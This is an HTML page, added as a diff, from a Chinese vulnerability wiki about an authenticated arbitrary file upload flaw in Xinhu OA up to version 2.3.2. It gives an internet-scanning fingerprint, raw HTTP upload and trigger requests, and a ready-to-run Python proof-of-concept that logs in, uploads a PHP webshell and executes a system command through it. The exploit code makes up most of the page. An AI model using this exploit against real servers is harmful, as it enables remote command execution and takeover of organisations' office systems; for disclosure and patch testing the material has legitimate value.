@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%BF%A1%E5%91%BCOA%20qcloudCosAction.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>信呼OA qcloudCosAction.php 任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u4fe1\u547cOA qcloudCosAction.php \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+              {title: "\u6f0f\u6d1ePOC", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%208000%E7%89%88%20workFlowService%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%208000%E7%89%88%20workFlowService%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        华天动力OA 8000版 workFlowService SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E4%BF%A1%E5%91%BCOA%20beifenAction.php%20%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E4%BF%A1%E5%91%BCOA%20beifenAction.php%20%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        信呼OA beifenAction.php 后台目录遍历漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="oa-qcloudcosactionphp">信呼OA qcloudCosAction.php 任意文件上传漏洞<a class="headerlink" href="#oa-qcloudcosactionphp" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>信呼 OA &lt;=v2.3.2 版本在<code>webmain\task\runt\qcloudCosAction.php</code>云存储下调用了<code>qcloudCosClassAction</code>方法，导致文件上传漏洞。通过该漏洞，攻击者可突破上传限制，上传 php 文件获取服务器shell。</p>
+<p>利用前提是已经获取了用户名/登陆口令。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/rainrocka/xinhu">https://github.com/rainrocka/xinhu</a></li>
+</ul>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>信呼OA &lt;= 2.3.2
+</code></pre></div>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app=&quot;信呼协同办公系统&quot;
+</code></pre></div>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登陆页面：</p>
+<p><img alt="" src="../images/%E4%BF%A1%E5%91%BCOA%20qcloudCosAction.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240124101156480.png" /></p>
+<p>登陆系统，找到上传点：</p>
+<div class="highlight"><pre><span></span><code>任务资源 → 文件传送 → 相关文件
+</code></pre></div>
+<p>上传1.php，记录filepath和id：</p>
+<div class="highlight"><pre><span></span><code>POST /index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=769871 HTTP/1.1
+Host: www.xinhu2.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type:multipart/form-data; boundary=
+---------------------------40605609116060410203660967062
+Content-Length: 250
+Origin: http://www.xinhu2.com
+Connection: close
+Referer:http://www.xinhu2.com/index.php?m=upload&amp;d=public&amp;callback=&amp;upkey=20220513091317429617&amp;showid=fileidview
+Cookie:deviceid=1650359786139;xinhu_mo_adminid=ye0xhh0xte0lp0yy0xtj0xtb0xtv0yy0xxt0jt0xtb0ye0yx0yp0le03;xinhu_ca_adminuser=admin;xinhu_ca_rempass=0;PHPSESSID=hp2qfqngssh75ij0r8j8kg6f47
+-----------------------------40605609116060410203660967062
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;
+Content-Type: application/octet-stream
+
+&lt;?php phpinfo(); ?&gt;
+
+-----------------------------40605609116060410203660967062--
+</code></pre></div>
+<p>查看1.php是否上传成功：</p>
+<div class="highlight"><pre><span></span><code>GET /task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=9 HTTP/1.1
+Host: www.xinhu2.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: deviceid=1650359786139; xinhu_mo_adminid=ye0xhh0xte0lp0yy0xtj0xtb0xtv0yy0xxt0jt0xtb0ye0yx0yp0le03; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0; PHPSESSID=hp2qfqngssh75ij0r8j8kg6f47
+Upgrade-Insecure-Requests: 1
+</code></pre></div>
+<p>上传后路径：</p>
+<div class="highlight"><pre><span></span><code>http://&lt;IP&gt;/upload/2024-01/23_16071247.php
+</code></pre></div>
+<h2 id="poc">漏洞POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p>poc.py</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 1.php为webshell</span>
+
+<span class="c1"># 需要修改以下内容：</span>
+<span class="c1"># url_pre = &#39;http://&lt;IP&gt;/&#39;</span>
+<span class="c1"># &#39;adminuser&#39;: &#39;&lt;ADMINUSER_BASE64&gt;&#39;,</span>
+<span class="c1"># &#39;adminpass&#39;: &#39;&lt;ADMINPASS_BASE64&gt;&#39;,</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+<span class="n">url_pre</span> <span class="o">=</span> <span class="s1">&#39;http://&lt;IP&gt;/&#39;</span>
+<span class="n">url1</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="s1">&#39;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#39;</span>
+<span class="n">url2</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="s1">&#39;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#39;</span>
+<span class="c1"># url3 = url_pre + &#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&lt;ID&gt;&#39;</span>
+<span class="n">data1</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;rempass&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;jmpass&#39;</span><span class="p">:</span> <span class="s1">&#39;false&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;device&#39;</span><span class="p">:</span> <span class="s1">&#39;1625884034525&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;ltype&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;adminuser&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;ADMINUSER_BASE64&gt;&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;adminpass&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;ADMINPASS_BASE64&gt;&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;yanzm&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>    
+<span class="p">}</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data1</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url2</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;1.php&#39;</span><span class="p">,</span> <span class="s1">&#39;r+&#39;</span><span class="p">)})</span>
+<span class="n">filepath</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;filepath&#39;</span><span class="p">])</span>
+<span class="n">filepath</span> <span class="o">=</span> <span class="s2">&quot;/&quot;</span> <span class="o">+</span> <span class="n">filepath</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.uptemp&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.php&#39;</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+<span class="nb">id</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span>
+<span class="n">url3</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="sa">f</span><span class="s1">&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s1">&#39;</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url3</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_pre</span> <span class="o">+</span> <span class="n">filepath</span> <span class="o">+</span> <span class="s2">&quot;?1=system(&#39;dir&#39;);&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%208000%E7%89%88%20workFlowService%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%208000%E7%89%88%20workFlowService%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        华天动力OA 8000版 workFlowService SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E4%BF%A1%E5%91%BCOA%20beifenAction.php%20%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E4%BF%A1%E5%91%BCOA%20beifenAction.php%20%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        信呼OA beifenAction.php 后台目录遍历漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
